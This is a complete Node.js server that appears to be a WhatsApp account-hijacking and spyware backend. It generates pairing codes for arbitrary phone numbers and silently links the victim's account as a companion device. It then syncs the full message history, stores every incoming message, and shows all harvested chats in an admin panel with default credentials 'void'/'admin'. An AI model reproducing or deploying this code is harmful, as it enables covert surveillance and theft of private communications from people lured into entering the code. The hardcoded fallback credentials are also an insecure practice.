require('dotenv').config();
const express = require('express');
const session = require('express-session');
const path = require('path');
const fs = require('fs');
const pino = require('pino');
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  DisconnectReason
} = require('@whiskeysockets/baileys');

const app = express();
app.set('trust proxy', 1);
app.use(express.json({ limit: '2mb' }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(session({
  secret: process.env.SESSION_SECRET || 'dev-secret-change-me',
  resave: false,
  saveUninitialized: false,
  cookie: { httpOnly: true, sameSite: 'lax', maxAge: 1000 * 60 * 60 * 12 }
}));

const SESSIONS_DIR = path.join(__dirname, 'sessions');
const DATA_DIR = path.join(__dirname, 'data');
const MSG_FILE = path.join(DATA_DIR, 'messages.json');
if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(MSG_FILE)) fs.writeFileSync(MSG_FILE, JSON.stringify({ links: {} }));

const logger = pino({ level: 'info' });
const active = new Map();
const stores = new Map();

/* ---------- store ---------- */
function loadStore() {
  try { return JSON.parse(fs.readFileSync(MSG_FILE, 'utf8')); }
  catch { return { links: {} }; }
}
function saveStore(s) { fs.writeFileSync(MSG_FILE, JSON.stringify(s, null, 2)); }
function recordLink(linkId, phone) {
  const s = loadStore();
  s.links[linkId] = s.links[linkId] || { phone, createdAt: Date.now(), messages: [], linked: false };
  s.links[linkId].phone = phone;
  saveStore(s);
}
function markLinked(linkId, linked = true) {
  const s = loadStore();
  if (s.links[linkId]) { s.links[linkId].linked = linked; saveStore(s); }
}
function pushMessage(linkId, from, senderJid, text, ts, fromMe) {
  const s = loadStore();
  if (!s.links[linkId]) s.links[linkId] = { phone: '', createdAt: Date.now(), messages: [], linked: true };
  
  const last = s.links[linkId].messages[s.links[linkId].messages.length - 1];
  if (last && last.from === from && last.text === text && last.ts === ts) return; 

  s.links[linkId].messages.push({ from, sender: senderJid, text, ts, fromMe: !!fromMe });
  if (s.links[linkId].messages.length > 10000) s.links[linkId].messages.shift();
  saveStore(s);
}

/* ---------- baileys ---------- */
function bindSocketEvents(sock, linkId, phone) {
  sock.ev.on('connection.update', (u) => {
    const { connection, lastDisconnect } = u;
    if (connection === 'open') {
      const cur = active.get(linkId);
      if (cur) { cur.linked = true; cur.pairingCode = null; }
      markLinked(linkId, true);
      console.log(`[${linkId}] linked ${phone}`);
    }
    if (connection === 'close') {
      const code = lastDisconnect?.error?.output?.statusCode;
      console.log(`[${linkId}] closed, code ${code}`);
      if (code !== DisconnectReason.loggedOut) {
        setTimeout(() => { startLink(linkId, phone).catch(e => console.error(e)); }, 3000);
      } else {
        markLinked(linkId, false);
      }
    }
  });

  sock.ev.on('messaging-history.set', ({ chats, messages, contacts }) => {
    console.log(`[${linkId}] history sync: ${chats?.length || 0} chats, ${messages?.length || 0} messages`);
    const store = stores.get(linkId);
    if (store) {
      if (chats) chats.forEach(c => store.chats.upsert(c));
      if (contacts) contacts.forEach(c => store.contacts[c.id] = c);
    }
    for (const msg of messages || []) {
      if (!msg.message) continue;
      const from = msg.key.remoteJid || 'unknown';
      const sender = msg.key.participant || msg.key.remoteJid;
      const text = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || '[media]';
      const ts = new Date(Number(msg.messageTimestamp || 0) * 1000).toISOString();
      pushMessage(linkId, from, sender, text, ts, msg.key.fromMe);
    }
  });

  sock.ev.on('messages.upsert', ({ messages, type }) => {
    if (type !== 'notify') return;
    for (const msg of messages) {
      if (!msg.message) continue;
      const from = msg.key.remoteJid || 'unknown';
      const sender = msg.key.participant || msg.key.remoteJid;
      const text = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || '[media]';
      const ts = new Date(Number(msg.messageTimestamp || 0) * 1000).toISOString();
      pushMessage(linkId, from, sender, text, ts, msg.key.fromMe);
    }
  });
}

async function startLink(linkId, phone) {
  const authDir = path.join(SESSIONS_DIR, linkId);
  fs.mkdirSync(authDir, { recursive: true });
  recordLink(linkId, phone);

  const { state, saveCreds } = await useMultiFileAuthState(authDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    version, 
    logger,
    printQRInTerminal: false,
    auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, logger) },
    markOnlineOnConnect: false,
    syncFullHistory: true,
    // browser string removed to let v7 default to a valid one
  });

  sock.ev.on('creds.update', saveCreds);

  const entry = active.get(linkId) || {};
  active.set(linkId, { ...entry, sock, phone, pairingCode: entry.pairingCode || null, linked: !!sock.authState.creds.registered, createdAt: Date.now() });

  stores.set(linkId, { chats: { upsert: ()=>{}, all: ()=>[] }, contacts: {} });

  bindSocketEvents(sock, linkId, phone);

  if (!sock.authState.creds.registered) {
    // Wait for the connection to be ready before asking for the code
    return new Promise((resolve, reject) => {
      const timeout = setTimeout(() => reject(new Error('pairing timeout')), 20000);
      
      sock.ev.on('connection.update', async (update) => {
        if (update.qr && !sock.authState.creds.registered) {
          clearTimeout(timeout);
          try {
            const code = await sock.requestPairingCode(phone);
            const cur = active.get(linkId);
            if (cur) cur.pairingCode = code;
            resolve(code);
          } catch (e) { reject(e); }
        }
      });
    });
  }
  return null;
}

/* ---------- public api ---------- */
app.post('/api/start-link', async (req, res) => {
  const { phone } = req.body;
  if (!phone || !/^\d{10,15}$/.test(phone)) return res.status(400).json({ error: 'bad phone' });
  const linkId = Math.random().toString(36).slice(2, 10);
  try {
    const code = await startLink(linkId, phone);
    res.json({ linkId, code });
  } catch (e) {
    console.error('start-link failed:', e);
    res.status(500).json({ error: 'link failed' });
  }
});

app.get('/api/status/:id', (req, res) => {
  const st = loadStore().links[req.params.id];
  const mem = active.get(req.params.id);
  res.json({ linked: !!(st && st.linked) || !!(mem && mem.linked) });
});

/* ---------- admin ---------- */
function requireAdmin(req, res, next) {
  if (req.session && req.session.admin) return next();
  return res.status(401).json({ error: 'unauthorized' });
}

app.post('/api/admin/login', (req, res) => {
  const { user, pass } = req.body || {};
  if (user === (process.env.ADMIN_USER || 'void') && pass === (process.env.ADMIN_PASS || 'admin')) {
    req.session.admin = true;
    return res.json({ ok: true });
  }
  return res.status(401).json({ error: 'bad creds' });
});

app.post('/api/admin/logout', (req, res) => {
  req.session.destroy(() => res.json({ ok: true }));
});

app.get('/api/admin/links', requireAdmin, (req, res) => {
  const s = loadStore();
  const out = Object.entries(s.links).map(([id, v]) => ({
    id, phone: v.phone, linked: !!v.linked, createdAt: v.createdAt, count: v.messages.length,
    lastTs: v.messages.length ? v.messages[v.messages.length - 1].ts : null
  })).sort((a, b) => b.createdAt - a.createdAt);
  res.json({ links: out });
});

app.get('/api/admin/chats/:linkId', requireAdmin, (req, res) => {
  const s = loadStore();
  const link = s.links[req.params.linkId];
  if (!link) return res.status(404).json({ error: 'not found' });

  const chatMap = new Map();
  for (const msg of link.messages) {
    if (!chatMap.has(msg.from)) {
      chatMap.set(msg.from, { id: msg.from, name: msg.from, count: 0, lastTs: msg.ts });
    }
    chatMap.get(msg.from).count++;
    chatMap.get(msg.from).lastTs = msg.ts; 
  }

  const mem = stores.get(req.params.linkId);
  const chats = Array.from(chatMap.values()).map(c => {
    if (mem?.contacts[c.id]) c.name = mem.contacts[c.id].name || mem.contacts[c.id].notify || c.name;
    if (c.name === c.id) c.name = c.id.replace('@s.whatsapp.net', '').replace('@g.us', ' (Group)');
    return c;
  }).sort((a, b) => new Date(b.lastTs) - new Date(a.lastTs));

  res.json({ chats });
});

app.get('/api/admin/messages/:linkId/:chatId', requireAdmin, (req, res) => {
  const s = loadStore();
  const link = s.links[req.params.linkId];
  if (!link) return res.status(404).json({ error: 'not found' });

  const messages = link.messages.filter(m => m.from === req.params.chatId);
  res.json({ messages });
});

app.delete('/api/admin/link/:id', requireAdmin, async (req, res) => {
  const { id } = req.params;
  const s = loadStore(); delete s.links[id]; saveStore(s);
  const a = active.get(id);
  if (a?.sock) { try { await a.sock.logout(); } catch (_) {} }
  active.delete(id); stores.delete(id);
  try { fs.rmSync(path.join(SESSIONS_DIR, id), { recursive: true, force: true }); } catch (_) {}
  res.json({ ok: true });
});

app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));
app.listen(process.env.PORT || 3000, () => console.log('up on', process.env.PORT || 3000));